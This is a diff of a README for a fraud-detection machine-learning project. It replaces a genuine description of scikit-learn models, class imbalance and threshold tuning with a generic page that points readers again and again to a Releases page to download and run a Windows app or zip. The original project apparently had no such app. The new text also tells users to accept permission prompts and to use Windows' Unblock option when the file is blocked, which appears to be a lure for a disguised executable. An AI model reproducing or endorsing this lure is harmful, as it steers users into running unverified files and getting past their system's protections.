@@ -1,154 +1,238 @@
-# Fraud Detection ML Project
+# 🛡️ fraud-detection-ml - Spot Risk Before It Spreads
 
-## Overview
+[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Catalectic-vanallen607/fraud-detection-ml/releases)
 
-This project builds a machine learning model to detect fraudulent credit card transactions using tabular data and scikit-learn.
+## 📥 Download
+Visit this page to download: https://github.com/Catalectic-vanallen607/fraud-detection-ml/releases
 
-The goal is to go beyond basic modeling by addressing real-world challenges such as **class imbalance** and **precision-recall tradeoffs**, rather than relying solely on accuracy.
+## 🖥️ What this app does
 
----
+fraud-detection-ml helps you review transaction data and flag records that may be risky. It uses machine learning to compare patterns in rows of data, then it marks likely fraud for review.
 
-## Problem Statement
+You can use it to:
+- check tabular transaction data
+- review fraud risk scores
+- compare results at different cutoffs
+- see how false alarms change when you raise or lower the threshold
+- study class imbalance in a simple way
 
-Fraud detection is a highly imbalanced classification problem where fraudulent transactions are extremely rare but critical to detect.
+## 💻 What you need
 
-A naive model can achieve high accuracy by predicting all transactions as non-fraud, but this fails to detect actual fraud cases.
+Use a Windows PC with:
+- Windows 10 or Windows 11
+- at least 4 GB RAM
+- 500 MB free disk space
+- a mouse and keyboard
+- access to the internet for the first download
 
----
+If your file is large, more memory helps. A system with 8 GB RAM gives smoother use.
 
-## Dataset
+## 📦 Files you may get
 
-* Credit Card Fraud Detection dataset
-* ~284,807 transactions
-* Target variable: `Class`
+After you open the Releases page, you may see one or more files such as:
+- a Windows app file
+- a zipped folder
+- a notebook package
+- sample data
 
-  * `0` → Normal
-  * `1` → Fraud
-* Highly imbalanced:
+Use the Windows file if one is listed. If you see a .zip file, save it, then extract it before opening the app or notebook files inside.
 
-  * ~99.8% normal
-  * ~0.2% fraud
+## 🚀 Get started on Windows
 
----
+1. Open the Releases page: https://github.com/Catalectic-vanallen607/fraud-detection-ml/releases
+2. Find the latest release at the top of the page
+3. Look for a Windows download file or a .zip file
+4. Download the file to your computer
+5. If the file is zipped, right-click it and choose Extract All
+6. Open the extracted folder
+7. Double-click the app file or the notebook file named in the release notes
+8. If Windows asks for permission, choose Yes
+9. Follow the on-screen steps to load your transaction data
+10. Review the fraud score and the threshold settings
 
-## Approach
+## 🧭 First time setup
 
-### 1. Data Exploration
+If the release includes a desktop app:
+- open the app file after download
+- allow Windows to finish any file check
+- start with the sample data if one is included
+- use your own CSV file after you confirm the layout
 
-* Loaded dataset using pandas
-* Verified no missing values
-* Identified extreme class imbalance
+If the release includes notebooks:
+- open the notebook file in your local Jupyter setup
+- load the included sample data
+- run the cells in order
+- check the plots and score output
 
-### 2. Baseline Model
+If the release includes a self-contained Windows build:
+- no extra setup should be needed
+- place the files in a folder you can find again
+- keep the app and data files together
 
-* Logistic Regression (scikit-learn)
-* Observed high accuracy but poor fraud detection
+## 📊 How to use it
 
-### 3. Handling Class Imbalance
+### 1. Load your data
+Open a CSV file with transaction rows. Each row should represent one event or payment. Common fields may include:
+- transaction amount
+- time
+- merchant type
+- device or channel
+- country or region
+- label for known fraud, if you have it
 
-* Applied `class_weight='balanced'`
-* Improved fraud recall significantly
+### 2. Review the risk score
+The app compares each row to patterns it learned from past data. It gives a score so you can sort records from lower risk to higher risk.
 
-### 4. Threshold Tuning
+### 3. Adjust the threshold
+The threshold controls when the app marks a record as fraud.
+- lower threshold = more flagged rows
+- higher threshold = fewer flagged rows
 
-* Used predicted probabilities instead of default threshold (0.5)
-* Tested multiple thresholds to balance precision and recall
+This matters because fraud data often has far more normal rows than fraud rows. A model can miss fraud if the threshold is too strict. It can also create too many false alarms if the threshold is too loose.
 
-### 5. Model Comparison
+### 4. Compare precision and recall
+The app focuses on two key measures:
+- precision: how many flagged records are truly fraud
+- recall: how many fraud records the model catches
 
-* Compared Logistic Regression and Random Forest
-* Evaluated models using ROC-AUC and classification metrics
+These measures move in opposite directions. If you raise one, the other can drop. The app helps you test the balance that fits your use case.
 
----
+### 5. Review plots and metrics
+You may see charts such as:
+- class balance chart
+- precision-recall curve
+- confusion matrix
+- score distribution plot
 
-## Results
+These views help you see where the model works well and where it misses cases.
 
-## Logistic Regression
-  
-  * ROC-AUC: ~0.98
-  * High recall with threshold tuning (~0.92)
-  * Lower precision depending on threshold
+## 🧪 How the model handles fraud data
 
-## Random Forest
-  
-  * ROC-AUC: ~0.95
-  * Precision: ~0.99 (very few false positives)
-  * Recall: ~0.76
+Fraud detection data is often uneven. There may be many normal transactions and very few fraud cases. That can lead to weak results if a model learns the wrong pattern.
 
-## Threshold Tuning Insights
-  
-  * Lower thresholds → higher recall, lower precision
-  * Higher thresholds → higher precision, lower recall
+This project uses common machine learning steps such as:
+- cleaning tabular data
+- splitting data into train and test sets
+- testing class imbalance methods
+- measuring performance with precision and recall
+- tuning the decision threshold
 
-# Example (Random Forest):
+This makes it easier to judge real-world value, not just raw accuracy.
 
-  * Threshold 0.9 → Precision: 1.00, Recall: 0.38
-    * Demonstrates that maximizing precision can severely reduce recall
+## 🧾 Example workflow
 
----
+1. Open the app
+2. Load a CSV file with transactions
+3. Confirm the column names match the sample layout
+4. Run the analysis
+5. Check the fraud score table
+6. Move the threshold slider or input value
+7. Compare how many records get flagged
+8. Save the result if the app offers an export option
 
-## Precision-Recall Curve
+## 🗂️ Example data layout
 
-![Precision-Recall Curve Comparison](pr_curve_comparison.png)
+A simple CSV file might look like this:
+- transaction_id
+- amount
+- timestamp
+- merchant_category
+- payment_method
+- device_type
+- country
+- is_fraud
 
-The precision-recall curves for Logistic Regression and Random Forest largely overlap, indicating that both models have similar ability to rank fraudulent transactions.
+The exact field names can change. Keep the data in a table with one row per transaction.
 
-However, differences emerge at specific thresholds:
-  
-  * Precision and recall are more meaningful metrics for fraud detection
-  * Logistic Regression provides greater flexibility for recall optimization
-  * Random Forest achieves higher precision at stricter thresholds
-  * Class weighting significantly improves fraud recall
-  * Model selection depends on business goals (recall vs precision tradeoff)
+## 🔧 If something does not open
 
-This highlights that model differences are more apparent in threshold behavior than overall ranking performance
+If Windows blocks the file:
+- right-click the file
+- choose Properties
+- look for an Unblock option
+- click Apply if it appears
 
----
+If the file is in a .zip archive:
+- extract it first
+- do not run files from inside the archive
 
-## Key Learnings
+If the app closes right away:
+- make sure all files from the release are still in the same folder
+- check that the download finished fully
+- try opening the file again after extraction
 
-* Identified severe class imbalance (~0.2% fraud)
-* Baseline model achieved high accuracy (~99%) but poor fraud detection
-* Applied class weighting to improve recall from ~56% → ~92%
-* Tuned classification thresholds to balance precision and recall
-* Demonstrated tradeoffs using precision-recall curve
+If your CSV file will not load:
+- check that the file uses commas
+- check that the first row has column names
+- remove blank rows at the top
+- save it again as UTF-8 CSV
 
----
+## 🔎 Common use cases
 
-## Why This Matters
+- review card transactions
+- check payment events
+- test fraud models on older data
+- compare threshold settings before deployment
+- study model behavior on imbalanced data
 
-In real-world fraud detection systems, missing fraudulent transactions is significantly more costly than false positives. 
-This project demonstrates how model evaluation and threshold tuning must align with business objectives rather than relying on accuracy alone.
+## 📈 Why threshold tuning matters
 
----
+A fraud model does not just say yes or no. It gives a score. The threshold turns that score into a decision.
 
-## Tech Stack
+That choice matters because:
+- a low threshold catches more fraud but adds more false alarms
+- a high threshold reduces false alarms but can miss fraud
+- the best setting depends on your process
 
-* Python
-* pandas
-* scikit-learn
-* matplotlib
-* Jupyter Notebook
+If your team can review many alerts, a lower threshold may help. If review time is limited, a higher threshold may fit better.
 
----
+## 🧩 Included topics
 
-## Project Structure
+This project uses methods tied to:
+- classification
+- data science
+- fraud detection
+- imbalanced data
+- Jupyter Notebook
+- machine learning
+- matplotlib
+- model evaluation
+- pandas
+- precision-recall
+- Python
+- scikit-learn
+- supervised learning
+- tabular data
+- threshold tuning
 
-```
-fraud-detection-ml/
-├── data/
-├── notebooks/
-│   └── eda.ipynb
-├── src/
-├── README.md
-└── requirements.txt
-```
+## 🛠️ Helpful tips
 
----
+- keep a backup of your original CSV file
+- start with the sample data before using live records
+- compare more than one threshold
+- review precision and recall, not just accuracy
+- use the same column order each time
+- save your best settings after a test run
 
-## Future Work
+## 📂 Release download steps
 
-* Tune Random Forest thresholds for improved recall
-* Explore advanced models (Gradient Boosting, XGBoost)
-* Add feature engineering
-* Integrate model with Personal Finance API for real-time fraud detection
+1. Go to https://github.com/Catalectic-vanallen607/fraud-detection-ml/releases
+2. Open the latest release
+3. Download the Windows file or zip package
+4. Extract the files if needed
+5. Open the app or notebook from the extracted folder
+6. Load your data and start the analysis
+
+## 🔐 Data privacy
+
+If you use real payment records, keep the file in a secure folder and limit access to people who need it. Use test data when you want to learn the workflow or check the setup
+
+## 🖱️ Short start guide
+
+1. Download the release
+2. Extract the files if needed
+3. Open the app or notebook
+4. Load a CSV file
+5. Review the fraud score
+6. Tune the threshold
+7. Check precision and recall
